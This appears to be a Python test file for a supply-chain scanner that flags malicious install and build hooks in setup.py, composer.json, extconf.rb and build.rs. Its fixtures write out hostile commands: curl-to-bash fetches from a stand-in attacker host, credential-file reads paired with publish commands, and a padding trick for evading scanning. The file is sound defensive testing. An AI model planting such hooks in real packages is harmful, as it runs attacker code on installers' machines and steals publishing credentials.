"""Tests for the cross-ecosystem hook adapters (Phase 6):

  * Python — ``setup.py`` lifecycle execution
  * Composer — ``composer.json`` ``scripts`` block
  * RubyGems — ``extconf.rb`` / ``mkrf_conf.rb`` extension build

All three reuse the shared :mod:`_hook_patterns` substrate so the
detection semantics match the npm adapter exactly.  Tests focus on
ECOSYSTEM PARITY — the same shape should fire across all four
adapters with the same severity.
"""

from __future__ import annotations

import json
from pathlib import Path

from packages.sca.models import (
    Confidence,
    Dependency,
    Manifest,
    PinStyle,
)
from packages.sca.supply_chain import (
    cargo_build_scripts,
    composer_lifecycle_hooks,
    python_lifecycle_hooks,
    rubygems_lifecycle_hooks,
)


def _dep(name: str, ecosystem: str, *, declared_in: Path) -> Dependency:
    return Dependency(
        ecosystem=ecosystem,
        name=name,
        version="1.0.0",
        declared_in=declared_in,
        scope="main",
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=True,
        purl=f"pkg:{ecosystem.lower()}/{name}@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def _manifest(p: Path, ecosystem: str) -> Manifest:
    return Manifest(path=p, ecosystem=ecosystem, is_lockfile=False)


# ---------------------------------------------------------------------------
# Python — setup.py
# ---------------------------------------------------------------------------

def test_python_setup_py_curl_pipe_shell_high(tmp_path: Path) -> None:
    """``setup.py`` containing ``curl | bash`` fires high (substrate
    dangerous-pattern match)."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import os\nos.system('curl https://evil.example | bash')\n"
        "from setuptools import setup\nsetup(name='victim')\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("victim", "PyPI", declared_in=py)],
    )
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "curl" in findings[0].confidence.reason or any(
        "curl" in r for r in findings[0].hit.reasons
    )


def test_python_setup_py_payload_past_chunk_cap_detected(
    tmp_path: Path,
) -> None:
    """The whole-file adapters feed ENTIRE source files through the
    shared substrate — a payload placed past the per-chunk bound
    must still be detected (prefix-only scanning made padding a
    total evasion)."""
    from packages.sca.supply_chain._hook_patterns import (
        _MAX_HOOK_BODY_BYTES,
    )
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
    padding = "# benign boilerplate\n" * (_MAX_HOOK_BODY_BYTES // 20 + 1)
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import os\n" + padding
        + "os.system('curl https://evil.example | bash')\n"
        "from setuptools import setup\nsetup(name='victim')\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("victim", "PyPI", declared_in=py)],
    )
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert any("curl" in r for r in findings[0].hit.reasons)


def test_python_setup_py_worm_shape_fires_high(tmp_path: Path) -> None:
    """``setup.py`` that reads ~/.pypirc AND calls ``twine upload``
    fires high under the worm-shape branch."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import subprocess\n"
        "subprocess.run(['cat', '~/.pypirc'])\n"
        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("victim", "PyPI", declared_in=py)],
    )
    assert findings[0].severity == "high"
    assert "self-replication" in findings[0].confidence.reason


def test_python_innocuous_setup_py_no_finding(tmp_path: Path) -> None:
    """A vanilla ``setup.py`` with no flagged pattern produces NO
    finding (FP-tightening — presence isn't signal for Python).
    """
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "from setuptools import setup\nsetup(name='victim')\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("victim", "PyPI", declared_in=py)],
    )
    assert findings == []


def test_python_no_setup_py_no_finding(tmp_path: Path) -> None:
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname='clean'\n", encoding="utf-8")
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("clean", "PyPI", declared_in=py)],
    )
    assert findings == []


# ---------------------------------------------------------------------------
# Composer — composer.json scripts
# ---------------------------------------------------------------------------

def test_composer_post_install_cmd_curl_pipe_shell_high(
    tmp_path: Path,
) -> None:
    cj = tmp_path / "composer.json"
    cj.write_text(json.dumps({
        "name": "victim/x",
        "scripts": {
            "post-install-cmd": "curl https://evil.example | bash",
        },
    }), encoding="utf-8")
    findings = composer_lifecycle_hooks.scan_manifests(
        [_manifest(cj, "Packagist")],
        [_dep("victim/x", "Packagist", declared_in=cj)],
    )
    assert any(f.severity == "high" for f in findings)


def test_composer_list_form_each_entry_scanned(tmp_path: Path) -> None:
    """Composer accepts ``[cmd1, cmd2]`` — each entry is its own
    command and must be scanned independently."""
    cj = tmp_path / "composer.json"
    cj.write_text(json.dumps({
        "name": "victim/x",
        "scripts": {
            "post-install-cmd": [
                "echo hello",
                "curl https://evil.example | bash",
            ],
        },
    }), encoding="utf-8")
    findings = composer_lifecycle_hooks.scan_manifests(
        [_manifest(cj, "Packagist")],
        [_dep("victim/x", "Packagist", declared_in=cj)],
    )
    # Both entries produce a finding; one of them must be high.
    assert any(f.severity == "high" for f in findings)


def test_composer_php_method_ref_skipped(tmp_path: Path) -> None:
    """Vendor\\Class::method form is a PHP method ref, not a shell
    command — skip it cleanly."""
    cj = tmp_path / "composer.json"
    cj.write_text(json.dumps({
        "name": "victim/x",
        "scripts": {
            "post-install-cmd": "MyVendor\\Installer::run",
        },
    }), encoding="utf-8")
    findings = composer_lifecycle_hooks.scan_manifests(
        [_manifest(cj, "Packagist")],
        [_dep("victim/x", "Packagist", declared_in=cj)],
    )
    assert findings == []


def test_composer_worm_shape_fires_high(tmp_path: Path) -> None:
    cj = tmp_path / "composer.json"
    cj.write_text(json.dumps({
        "name": "victim/x",
        "scripts": {
            "post-install-cmd": (
                "cat ~/.composer/auth.json && composer publish"
            ),
        },
    }), encoding="utf-8")
    findings = composer_lifecycle_hooks.scan_manifests(
        [_manifest(cj, "Packagist")],
        [_dep("victim/x", "Packagist", declared_in=cj)],
    )
    assert any(
        f.severity == "high" and "self-replication" in f.confidence.reason
        for f in findings
    )


def test_composer_no_scripts_no_finding(tmp_path: Path) -> None:
    cj = tmp_path / "composer.json"
    cj.write_text(json.dumps({"name": "clean/x"}), encoding="utf-8")
    findings = composer_lifecycle_hooks.scan_manifests(
        [_manifest(cj, "Packagist")],
        [_dep("clean/x", "Packagist", declared_in=cj)],
    )
    assert findings == []


# ---------------------------------------------------------------------------
# RubyGems — extconf.rb
# ---------------------------------------------------------------------------

def test_rubygems_extconf_curl_pipe_shell_high(tmp_path: Path) -> None:
    """An ``ext/<name>/extconf.rb`` shipping curl-pipe-shell fires
    high via the substrate dangerous-pattern match."""
    ext_dir = tmp_path / "ext" / "victim"
    ext_dir.mkdir(parents=True)
    extconf = ext_dir / "extconf.rb"
    extconf.write_text(
        'system("curl https://evil.example | bash")\n'
        'require "mkmf"\ncreate_makefile("victim")\n',
        encoding="utf-8",
    )
    findings = rubygems_lifecycle_hooks.scan_target(tmp_path, [], [])
    assert any(f.severity == "high" for f in findings)


def test_rubygems_extconf_worm_shape_fires_high(tmp_path: Path) -> None:
    ext_dir = tmp_path / "ext" / "victim"
    ext_dir.mkdir(parents=True)
    extconf = ext_dir / "extconf.rb"
    extconf.write_text(
        'system("cat ~/.gem/credentials")\n'
        'system("gem push pkg/victim.gem")\n',
        encoding="utf-8",
    )
    findings = rubygems_lifecycle_hooks.scan_target(tmp_path, [], [])
    assert any(
        f.severity == "high" and "self-replication" in f.confidence.reason
        for f in findings
    )


def test_rubygems_innocuous_extconf_no_finding(tmp_path: Path) -> None:
    """A vanilla ``extconf.rb`` with no flagged pattern produces NO
    finding — extconf.rb legitimately calls ``system`` for autoconf-
    style platform probes; mere presence isn't signal."""
    ext_dir = tmp_path / "ext" / "victim"
    ext_dir.mkdir(parents=True)
    extconf = ext_dir / "extconf.rb"
    extconf.write_text(
        'require "mkmf"\ncreate_makefile("victim")\n',
        encoding="utf-8",
    )
    findings = rubygems_lifecycle_hooks.scan_target(tmp_path, [], [])
    assert findings == []


def test_rubygems_no_extconf_no_finding(tmp_path: Path) -> None:
    findings = rubygems_lifecycle_hooks.scan_target(tmp_path, [], [])
    assert findings == []


def test_rubygems_mkrf_conf_also_scanned(tmp_path: Path) -> None:
    """``mkrf_conf.rb`` is the rake-build-compile-friendly alias for
    extconf — same risk, must also be scanned."""
    ext_dir = tmp_path / "ext" / "victim"
    ext_dir.mkdir(parents=True)
    mkrf = ext_dir / "mkrf_conf.rb"
    mkrf.write_text(
        'system("curl https://evil.example | bash")\n',
        encoding="utf-8",
    )
    findings = rubygems_lifecycle_hooks.scan_target(tmp_path, [], [])
    assert any(f.severity == "high" for f in findings)


# ---------------------------------------------------------------------------
# Host attribution — the hook belongs to the PACKAGE, never to a dep
# it declares (dep ordering is scanned-repo-controlled)
# ---------------------------------------------------------------------------

def test_python_host_is_package_own_name_not_first_dep(
    tmp_path: Path,
) -> None:
    py = tmp_path / "pyproject.toml"
    py.write_text(
        "[project]\nname = 'victim'\nversion = '2.0.0'\n",
        encoding="utf-8",
    )
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import os\nos.system('curl https://evil.example | bash')\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("innocent-dep", "PyPI", declared_in=py)],
    )
    assert len(findings) == 1
    assert findings[0].dependency.name == "victim"
    assert findings[0].dependency.version == "2.0.0"


def test_python_worm_suppression_keys_on_own_name_not_first_dep(
    tmp_path: Path,
) -> None:
    """A project whose FIRST DECLARED DEP is a publish helper (``np``
    is on the allowlist) must NOT have its own credential-read +
    publish hook finding suppressed — the suppression is for when the
    package ITSELF is a publish helper."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname = 'victim'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import subprocess\n"
        "subprocess.run(['cat', '~/.pypirc'])\n"
        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")],
        [_dep("np", "PyPI", declared_in=py)],
    )
    assert len(findings) == 1
    assert "self-replication" in findings[0].confidence.reason


def test_python_worm_suppression_requires_attested_helper(
    tmp_path: Path,
) -> None:
    """A VENDORED copy of an allowlisted PyPI helper (``vendor/``
    entry named by the installer, in a directory the discovery walk
    never yields from an in-tree plant) suppresses the promotion —
    but still emits a LOW row so the HOOK family survives for the
    composite chokepoint."""
    pkg_dir = tmp_path / "vendor" / "twine"
    pkg_dir.mkdir(parents=True)
    py = pkg_dir / "pyproject.toml"
    py.write_text("[project]\nname = 'twine'\n", encoding="utf-8")
    setup_py = pkg_dir / "setup.py"
    setup_py.write_text(
        "import subprocess\n"
        "subprocess.run(['cat', '~/.pypirc'])\n"
        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")], [],
    )
    assert len(findings) == 1
    assert findings[0].severity == "low"
    assert "suppressed" in findings[0].confidence.reason


def test_python_worm_suppression_not_granted_by_walked_vendor_dir(
    tmp_path: Path,
) -> None:
    """``site-packages`` (and ``gems`` / ``dist-packages``) ARE walked
    by discovery, so a committed ``site-packages/twine/`` tree is
    attacker-plantable layout — it must NOT attest the self-declared
    allowlist name."""
    pkg_dir = tmp_path / "site-packages" / "twine"
    pkg_dir.mkdir(parents=True)
    py = pkg_dir / "pyproject.toml"
    py.write_text("[project]\nname = 'twine'\n", encoding="utf-8")
    setup_py = pkg_dir / "setup.py"
    setup_py.write_text(
        "import subprocess\n"
        "subprocess.run(['cat', '~/.pypirc'])\n"
        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")], [],
    )
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "self-replication" in findings[0].confidence.reason


def test_allowlist_is_ecosystem_keyed(tmp_path: Path) -> None:
    """A RubyGems gem naming itself after an npm / PyPI publish
    helper (``np``) must not inherit those ecosystems' suppression —
    even from a gems-style vendored path."""
    from packages.sca.supply_chain import _hook_patterns
    gem_manifest = (
        tmp_path / "vendor" / "np-1.0.0" / "Gemfile"
    )
    dep = _dep("np", "RubyGems", declared_in=gem_manifest)
    assert not _hook_patterns.is_publish_helper(dep)
    assert not _hook_patterns.is_attested_publish_helper(dep)
    # Same name in its OWN ecosystem still matches (name check only).
    npm_dep = _dep("np", "npm", declared_in=tmp_path / "package.json")
    assert _hook_patterns.is_publish_helper(npm_dep)


def test_vendor_attestation_dirs_are_discovery_excluded() -> None:
    """Drift guard for the attestation invariant: every directory
    name that can attest a publish helper must be excluded from the
    discovery walk — otherwise a hostile repo can commit a fake
    vendor tree that discovery hands straight to the adapters."""
    from packages.sca import discovery
    from packages.sca.supply_chain import _hook_patterns
    assert _hook_patterns._VENDOR_DIR_NAMES <= discovery.EXCLUDED_DIR_NAMES


def test_python_self_declared_helper_name_does_not_suppress(
    tmp_path: Path,
) -> None:
    """A top-level project merely CLAIMING an allowlisted name gets no
    suppression — the name is attacker-declared manifest content."""
    py = tmp_path / "pyproject.toml"
    py.write_text("[project]\nname = 'np'\n", encoding="utf-8")
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import subprocess\n"
        "subprocess.run(['cat', '~/.pypirc'])\n"
        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
        encoding="utf-8",
    )
    findings = python_lifecycle_hooks.scan_manifests(
        [_manifest(py, "PyPI")], [],
    )
    assert len(findings) == 1
    assert "self-replication" in findings[0].confidence.reason


def test_cargo_host_is_crate_own_name_not_first_dep(
    tmp_path: Path,
) -> None:
    ct = tmp_path / "Cargo.toml"
    ct.write_text(
        '[package]\nname = "victim-crate"\nversion = "0.3.0"\n'
        '[dependencies]\nserde = "1"\n',
        encoding="utf-8",
    )
    (tmp_path / "build.rs").write_text(
        'fn main() { std::process::Command::new("sh")'
        '.arg("-c").arg("curl https://evil.example | bash")'
        '.status().unwrap(); }\n',
        encoding="utf-8",
    )
    findings = cargo_build_scripts.scan_manifests(
        [_manifest(ct, "Cargo")],
        [_dep("serde", "Cargo", declared_in=ct)],
    )
    assert len(findings) == 1
    assert findings[0].dependency.name == "victim-crate"
    assert findings[0].dependency.version == "0.3.0"


def test_rubygems_host_uses_gemspec_own_name(tmp_path: Path) -> None:
    gemspec = tmp_path / "victim-gem.gemspec"
    gemspec.write_text(
        'Gem::Specification.new do |s|\n'
        '  s.name = "victim-gem"\n  s.version = "1.2.0"\n'
        'end\n',
        encoding="utf-8",
    )
    ext_dir = tmp_path / "ext" / "victim"
    ext_dir.mkdir(parents=True)
    (ext_dir / "extconf.rb").write_text(
        'system("curl https://evil.example | bash")\n',
        encoding="utf-8",
    )
    findings = rubygems_lifecycle_hooks.scan_target(
        tmp_path,
        [_manifest(gemspec, "RubyGems")],
        [_dep("innocent-dep", "RubyGems", declared_in=gemspec)],
    )
    assert findings
    assert all(f.dependency.name == "victim-gem" for f in findings)


def test_orphan_commit_host_is_package_own_name(tmp_path: Path) -> None:
    from packages.sca.supply_chain import orphan_commit_dep

    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps({
        "name": "victim-pkg",
        "version": "3.0.0",
        "optionalDependencies": {
            "@antv/setup": "github:antvis/G2#" + "1" * 40,
        },
    }), encoding="utf-8")
    findings = orphan_commit_dep.scan_manifests(
        [_manifest(pkg, "npm")],
        [_dep("innocent-dep", "npm", declared_in=pkg)],
    )
    assert findings
    assert all(f.dependency.name == "victim-pkg" for f in findings)


def test_composer_detector_fires_on_real_discovery_output(
    tmp_path: Path,
) -> None:
    """End-to-end producer→consumer key check: the manifests handed to
    the detector in production come from discovery.find_manifests,
    which classifies composer.json as "Packagist" (the OSV ecosystem
    name). The detector once filtered on the registry-brand spelling
    "Composer" — matching nothing, ever — and only hand-built test
    manifests kept it looking alive."""
    from packages.sca.discovery import find_manifests
    from packages.sca.parsers import parse_manifest

    repo = tmp_path / "php-proj"
    repo.mkdir()
    (repo / "composer.json").write_text(json.dumps({
        "name": "victim/app",
        "require": {"monolog/monolog": "^2.0"},
        "scripts": {
            "pre-install-cmd": "curl https://evil.example | bash",
        },
    }), encoding="utf-8")

    manifests = list(find_manifests(repo))
    assert manifests, "discovery found no composer manifest"
    deps = [d for m in manifests for d in (parse_manifest(m) or [])]
    findings = composer_lifecycle_hooks.scan_manifests(manifests, deps)
    assert findings, (
        "composer lifecycle detector saw real discovery output and "
        "matched nothing — producer/consumer ecosystem key mismatch"
    )
    assert findings[0].hit.script_key == "pre-install-cmd"
